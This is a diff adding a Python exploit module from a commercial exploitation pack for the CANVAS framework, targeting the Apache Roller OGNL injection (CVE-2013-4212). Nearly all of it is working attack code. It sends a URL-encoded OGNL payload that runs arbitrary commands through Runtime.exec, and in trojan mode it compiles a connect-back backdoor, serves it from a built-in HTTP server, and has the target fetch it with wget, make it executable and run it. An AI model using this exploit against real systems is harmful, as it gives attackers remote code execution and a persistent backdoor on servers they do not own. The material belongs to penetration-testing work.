@@ -1,0 +1,279 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+import sys, time, os, thread
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from MOSDEF import mosdef
+from libs.spkproxy import header, body
+from libs.canvasos import *
+import StringIO
+import urllib
+
+NAME = "d2sec_apache_roller"
+VERSION = "0.1"
+DESCRIPTION = "Apache Roller OGNL Injection Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [["Linux"]]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "< 5.0.2"
+DOCUMENTATION["Date public"] = "2013/10/31"
+DOCUMENTATION["References"] = "http://security.coverity.com/advisory/2013/Oct/remote-code-execution-in-apache-roller-via-ognl-injection.html"
+DOCUMENTATION["CVE Name"] = "CVE-2013-4212"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4212"
+
+NOTES = """
+Usage:
+
+-- Single command mode --
+./3rdparty/D2SEC/d2sec_apache_roller/d2sec_apache_roller -t 172.16.244.141 -p 8080 -O cmd:"mkdir /tmp/pwned"
+
+-- Automatic MOSDEF trojan download and exec for Linux --
+./commandlineInterface.py -p 5555 -v 3
+./3rdparty/D2SEC/exploits/d2sec_apache_roller/d2sec_apache_roller -t 172.16.244.141 -p 8080 -l 172.16.244.143 -d 5555 
+"""
+
+DOCUMENTATION["Notes"] = NOTES
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.TROJANMODE = 0
+    self.host = '' 
+    self.port = 8080 
+    self.cmd = ''
+    self.uri = 'roller-5.0.0-tomcat'
+    self.name = NAME
+    self.trojanname = 'mosdef'
+	
+  def neededListenerTypes(self):
+    return [canvasengine.LINUXMOSDEF_INTEL]
+
+  def maketrojan(self):
+    t_os = canvasos('Linux')
+    t_os.arch = "X86"
+    from MOSDEF import makeexe
+    from MOSDEF.cc import threadsafe_cc_main
+    self.log('[D2] Compiling Unix trojan')
+    infilename = "backdoors/cback_mmap_rwx.c"
+    vars = {}
+    vars['CBACK_PORT'] = self.callback.port
+    vars['CBACK_ADDR'] = str2int32(socket.inet_aton(self.callback.ip))
+    self.log('[D2] Callback address is %s' % vars['CBACK_ADDR'])
+    cc_command = []
+    for var in vars:
+      cc_command += ["-D","%s=%s"%(var,vars[var])]
+    cc_command += ["-d", "-v","-m","Linux" ,"-p", "i386","-k", "None", infilename]
+    self.log('[D2] CC command: %s"%cc_command')
+    mosdeftrojan = threadsafe_cc_main(cc_command)
+    if not mosdeftrojan:
+      self.log('[D2] Was unable to create trojan!')
+      return ''
+    self.log('[D2] Length of CC compiled trojan: %s' % len(mosdeftrojan))
+    self.log('[D2] Writing out %d bytes to %s' % (len(mosdeftrojan), self.trojanname))
+    file(self.trojanname, "wb").write(mosdeftrojan)
+    ret = len(mosdeftrojan) != 0
+    return ret
+
+  def makesploit(self, clientheader, clientbody):
+    from libs.spkproxy import header, body
+    h = header('SERVER')
+    b = body()
+    self.maketrojan()
+    if clientheader.URL.count(self.trojanname):
+      self.log("Sending MOSDEF trojan")
+      f = open(self.trojanname, "rb")
+      sploitstring = f.read()
+      f.close()
+      os.remove(self.trojanname)
+      self.log("Sending %d bytes"%len(sploitstring))
+      h.addHeader("Content-type","binary/octet-stream")
+      h.addHeader("Connection","close")
+      b.setBody(sploitstring)
+    return h, b
+
+
+  #################################################################################################################
+  # Code from httpserver.py
+  def listen(self):
+    s = self.gettcplistener(80, "0.0.0.0")
+    if not s:
+      if self.port < 1024:
+        self.log('[D2] Cannot listen on port %d - perhaps we need to be root or that port is already bound? ' \
+          'you can try to bind to a higher port' % self.port)
+      else:
+        self.log('[D2] Cannot listen on port %d - perhaps that port is already bound ?' % self.port)
+        return 0
+    s.set_timeout(5)
+    self.s = s
+    return s
+
+  def accept(self, s=None):
+    """
+      Try to accept one connection
+      returns true if we found one
+    """
+    #we loop on this ,so no annoying printouts here
+    #self.log("Accepting connection")
+    if s == None:
+      s = self.s
+    try:
+      infd,addr = s.accept()
+    #except timeoutsocket.Timeout:
+    except Exception, e:
+      #self.log("Timed out - no accept yet")
+      return
+    if infd == -1:
+      return
+    #else we have an infd
+    self.handle(infd)
+    return True #handled connection
+
+  def handle(self, infd):
+    self.log('[D2] Handling connection')
+    clientheader = header(state = "SERVER")
+    #clientheader.ssl = self.ss
+    ret = clientheader.readdata(infd)
+    clientbody = body()
+    if clientheader.gotGoodHeader():
+      if clientheader.bodySize()>0 or clientheader.wasChunked:
+        self.log('[D2] Reading body')
+        clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+        self.log('[D2] Read body')
+    self.log('[D2] Creating exploit response')
+    servheader,servbody = self.makesploit(clientheader,clientbody)
+    self.log('[D2] Responding')
+    bodydata = ''.join(servbody.data)
+    #now we respond...
+    response = ''
+    response += '%s %s %s\r\n' % (servheader.version, servheader.status, servheader.msg)
+    #self.log(response)
+    for akey in servheader.headerValuesDict.keys():
+      if akey not in [ "Content-Length", "Content-length"]:
+        response += servheader.grabHeader(akey)
+    self.log('[D2] Sending header data of %d bytes' % len(response))
+    chunked = 0 #for now, eventually we'll send random chunks down the pipe.\..
+    if not chunked:
+      response += 'Content-Length: '+str(len(bodydata))+'\r\n'
+    response += '\r\n'
+    response += ''.join(bodydata)
+    self.log('[D2] Total response length is %d bytes' % len(response))
+    try:
+      infd.sendall(response)
+    except socket.error:
+      self.log('[D2] Connection closed by peer')
+    self.log('[D2] Response sent')
+    infd.close() #connection close - later on we'll keep it.
+    return
+  #
+  #################################################################################################################
+
+  def startHTTPServer(self):
+    s = self.listen()
+    if not s:
+      self.log('[D2] Failed to listen - not running')
+      return 0
+    while 1:
+      if self.state == self.HALT:
+        self.s.close()
+        break
+      self.accept()
+    return 1
+
+  def _roller_remote_exec(self, command):
+    #payload = "'bash','-c','%s'" % urllib.quote(command, safe='')
+    content = StringIO.StringIO()
+    try:
+      import pycurl
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      self.log('[D2] Install module python-pycurl')
+      return 0
+    request = ''
+    request += 'http://%s:%d/%s/roller-ui/login.rol?pageTitle=' % (self.host, self.port, self.uri)
+    request += urllib.quote('${#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Runtime@getRuntime().exec(\"%s\")}' % command)
+    print request
+    try:
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, '%s' % request)
+      c.setopt(c.WRITEFUNCTION, content.write)
+      c.setopt(c.TIMEOUT, 15)
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.perform()
+      #c.close()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return ''
+    data = content.getvalue()
+    if not (data.lower().startswith("<html") or data.lower().endswith("</html>")): 
+      if len(data) > 0:
+        data = data.replace('\x00', '')
+        self.log(data)
+
+
+  def roller_remote_exec(self):
+    if ';' in self.cmd:
+      commands = self.cmd.split(';')
+      for command in commands:
+        self.log('[D2] Execute \"%s\"' % command)
+        data = self._roller_remote_exec(command)
+        self.log(data)
+        time.sleep(5)
+    else:
+      self._roller_remote_exec(self.cmd) 
+      self.log('[D2] Execute \"%s\"' % self.cmd)
+    
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    self.uri = self.argsDict.get("uri",self.uri)
+    if (self.argsDict.get("cmd", self.cmd) == ''):
+      self.TROJANMODE = 1
+      self.cmd = 'wget -O /tmp/%s %s/%s; chmod +x /tmp/%s; /tmp/%s' % (self.trojanname, self.callback.ip, self.trojanname, self.trojanname, self.trojanname)
+      thread.start_new_thread(self.startHTTPServer,())
+    else:
+      self.cmd = self.argsDict.get("cmd", self.cmd)
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    self.log('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    time.sleep(5)
+    if (self.TROJANMODE == 1):
+      self.log('[D2] Create, download and execute Linux mosdef payload')
+    self.roller_remote_exec()
+    if (self.TROJANMODE == 1):
+      #self.log('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+      #self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+      while 1:
+        time.sleep(1)
+    self.log('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: "+sys.argv[0]+" -t target [-p port:8080] -l localip -d localport -O uri:<uri> -O cmd:<command> -O param:<value>" 
+    print "If cmd parameter is null, a Linux mosdef payload will be used."
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
